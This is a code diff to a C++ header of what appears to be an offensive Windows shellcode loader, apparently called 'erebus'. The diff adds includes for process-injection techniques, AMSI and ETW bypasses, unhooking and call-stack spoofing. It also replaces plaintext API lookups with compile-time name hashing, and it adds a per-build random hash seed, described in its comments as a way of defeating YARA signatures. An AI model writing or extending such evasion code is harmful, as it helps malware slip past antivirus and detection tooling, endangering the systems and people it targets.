@@ -12,7 +12,17 @@
 #include "injection/injection_createfiber.hpp"
 #include "injection/injection_earlycascade.hpp"
 #include "injection/injection_poolparty.hpp"
+#include "injection/injection_module_stomp.hpp"
+#include "injection/injection_kernelcallback.hpp"
+#include "injection/injection_txf_hollow.hpp"
 #include <cmath>
+
+#if CONFIG_CALLSTACK_SPOOF_ENABLED
+#include "evasion/callstack_spoof.hpp"
+#endif
+#include "evasion/amsi_bypass.hpp"
+#include "evasion/etw_bypass.hpp"
+#include "evasion/unhook_extended.hpp"
 
 // Define missing SAL annotations for compatibility
 #ifndef _In_
@@ -62,7 +72,9 @@
 #pragma region [typedefs]
 
 // Only define these if winternl.h hasn't been included already
-// winternl.h defines many of these same structures
+// winternl.h defines many of these same structures.
+// Note: VMLoader builds shadow /usr/share/mingw-w64/include/winternl.h with an
+// empty include/winternl.h so the system header is never processed there.
 #ifndef _WINTERNL_
 
 // PROCESSOR_NUMBER is in winnt.h (windows.h), skip if already defined
@@ -1420,9 +1432,22 @@ typedef struct _IO_STATUS_BLOCK
 	ULONG_PTR Information;
 } IO_STATUS_BLOCK, * PIO_STATUS_BLOCK;
 
+// Sentinel: set when this block ran (i.e. MinGW / no pre-existing winternl.h).
+// TUs that also #include <winternl.h> should guard that include with
+//   #ifndef EREBUS_NT_TYPES_DEFINED / #include <winternl.h> / #endif
+// to avoid redefinition errors when the MinGW system winternl.h (pragma-once
+// only, no _WINTERNL_ macro guard) would otherwise re-emit these types.
+#define EREBUS_NT_TYPES_DEFINED 1
+
 #endif // _WINTERNL_ - Types after this point are not in standard winternl.h
 
-// These types are not in winternl.h and must always be defined
+// These types are not in winternl.h. They DO overlap with the SysWhispers3
+// Syscalls.h block (SECTION_INHERIT, PS_ATTRIBUTE, PS_CREATE_STATE, ...), so
+// translation units that pull Syscalls.h in first (sw3_backend.cpp) define
+// EREBUS_SKIP_NT_EXTENSIONS before including this header to avoid duplicate
+// definitions. The PCUNICODE_STRING / PTEB / PPEB aliases referenced in the
+// typedef signatures past line ~2050 must be provided by the skipping TU.
+#ifndef EREBUS_SKIP_NT_EXTENSIONS
 typedef enum _SECTION_INHERIT
 {
 	ViewShare = 1,
@@ -2212,6 +2237,54 @@ typedef NTSTATUS(NTAPI* typeRtlCreateUnicodeString)(
 	_In_opt_z_ PCWSTR SourceString
 	);
 
+typedef NTSTATUS(NTAPI* typeNtCreateMutant)(
+	_Out_ PHANDLE MutantHandle,
+	_In_ ACCESS_MASK DesiredAccess,
+	_In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
+	_In_ BOOLEAN InitialOwner
+	);
+
+// TimerType: 0 = NotificationTimer (manual-reset), 1 = SynchronizationTimer (auto-reset)
+typedef NTSTATUS(NTAPI* typeNtCreateTimer)(
+	_Out_ PHANDLE TimerHandle,
+	_In_ ACCESS_MASK DesiredAccess,
+	_In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
+	_In_ ULONG TimerType
+	);
+
+// TimerApcRoutine / TimerContext may be NULL for non-APC usage.
+typedef NTSTATUS(NTAPI* typeNtSetTimer)(
+	_In_ HANDLE TimerHandle,
+	_In_ PLARGE_INTEGER DueTime,
+	_In_opt_ PVOID TimerApcRoutine,
+	_In_opt_ PVOID TimerContext,
+	_In_ BOOLEAN WakeTimer,
+	_In_opt_ LONG Period,
+	_Out_opt_ PBOOLEAN PreviousState
+	);
+
+// MapType: MAP_PROCESS=1 (working-set lock), MAP_SYSTEM=2 (physical lock, needs privilege)
+typedef NTSTATUS(NTAPI* typeNtLockVirtualMemory)(
+	_In_ HANDLE ProcessHandle,
+	_Inout_ PVOID* BaseAddress,
+	_Inout_ PSIZE_T RegionSize,
+	_In_ ULONG MapType
+	);
+
+typedef NTSTATUS(NTAPI* typeNtUnlockVirtualMemory)(
+	_In_ HANDLE ProcessHandle,
+	_Inout_ PVOID* BaseAddress,
+	_Inout_ PSIZE_T RegionSize,
+	_In_ ULONG MapType
+	);
+
+typedef NTSTATUS(NTAPI* typeNtQueryPerformanceCounter)(
+	_Out_ PLARGE_INTEGER PerformanceCounter,
+	_Out_opt_ PLARGE_INTEGER PerformanceFrequency
+	);
+
+#endif // EREBUS_SKIP_NT_EXTENSIONS
+
 #pragma endregion
 
 #pragma region [macros]
@@ -2244,11 +2317,28 @@ typedef NTSTATUS(NTAPI* typeRtlCreateUnicodeString)(
 
 #define MAX_BUFFER_SIZE 1024
 
+// --------------------------------------------------------------------------
+// API resolution macros.
+//
+// These used to call GetModuleHandleA / GetProcAddress with plaintext names,
+// which left every DLL and function name in .rdata as a string signature.
+// They now route through the PEB/export-table walkers in api_hashing.cpp and
+// hash both the module and function names at compile time via the H() macro
+// below. String literals passed to H() are consumed in a constant-expression
+// context and are not emitted to the binary under -O2.
+//
+// Call sites are unchanged: ImportModule("ntdll.dll") and
+// ImportFunction(ntdll, NtClose, typeNtClose) still work, but the binary no
+// longer ships the strings.
+// --------------------------------------------------------------------------
+template <ULONG N> struct _EbsCtHash { static constexpr ULONG value = N; };
+#define H(s) (_EbsCtHash<erebus::HashStringFowlerNollVoVariant1a(s)>::value)
+
 #define ImportModule(dll) \
-    GetModuleHandleA(dll)
+    erebus::GetModuleHandleC(H(dll))
 
 #define ImportFunction(dll_module, function, type) \
-    type function = (type) GetProcAddress(dll_module, #function)
+    type function = (type)erebus::GetProcAddressC(dll_module, H(#function))
 
 #define COLOUR_DEFAULT "\033[0m"
 #define COLOUR_BOLD "\033[1m"
@@ -2350,9 +2440,17 @@ namespace erebus {
 	//
 	PPEB GetPEB(void);
 
+	// Per-build hash seed. The default matches the historical literal so
+	// existing builds hash identically, but builder.py passes a fresh
+	// randomized value via -DEREBUS_HASH_SEED=0x.... on every compile.
+	// Changing this constant changes every API-hash value in the binary,
+	// defeating family-level YARA that pins on fixed hash constants.
+	#ifndef EREBUS_HASH_SEED
+	#define EREBUS_HASH_SEED 0x6A6CCC06
+	#endif
 	constexpr ULONG RandomHashSeed()
 	{
-		ULONG Seed = 0x6A6CCC06;
+		ULONG Seed = EREBUS_HASH_SEED;
 
 		Seed = (Seed * 0x25EDE3FB) ^ (Seed >> 16);
 		return Seed;
@@ -2367,15 +2465,26 @@ namespace erebus {
 		return (c >= 'A' && c <= 'Z') ? (c + 32) : c;
 	}
 
+	// Canonical FNV1a 32-bit prime. MUST be odd: an even multiplier
+	// collapses the low bits of Hash on every iteration, so distinct
+	// strings collide to the same value. Earlier revisions used
+	// `Prime = RandomHashSeed()` to randomise the prime per build, but
+	// RandomHashSeed() is constexpr-deterministic (so Prime == Hash on
+	// every call) AND ~50% of operator-generated seeds are even, which
+	// produced silent hash collisions between e.g. ntdll.dll and
+	// kernel32.dll and crashed the loader at GetModuleHandleC time.
+	// We keep the per-build randomisation on the offset basis (Hash)
+	// for YARA evasion and pin Prime to the standard FNV1a constant.
+	constexpr ULONG kFnv1aPrime = 0x01000193u;
+
 	constexpr ULONG HashStringFowlerNollVoVariant1a(_In_ LPCSTR String)
 	{
 		ULONG Hash = erebus::RandomHashSeed();
-		ULONG Prime = erebus::RandomHashSeed();
 
 		while (*String)
 		{
 			Hash ^= erebus::HashToLower((UCHAR)*String++);
-			Hash *= Prime;
+			Hash *= kFnv1aPrime;
 		}
 
 		return Hash;
@@ -2383,12 +2492,11 @@ namespace erebus {
 	constexpr ULONG HashStringFowlerNollVoVariant1a(_In_ LPCWSTR String)
 	{
 		ULONG Hash = erebus::RandomHashSeed();
-		ULONG Prime = erebus::RandomHashSeed();
 
 		while (*String)
 		{
 			Hash ^= erebus::HashToLower((UCHAR)*String++);
-			Hash *= Prime;
+			Hash *= kFnv1aPrime;
 		}
 
 		return Hash;
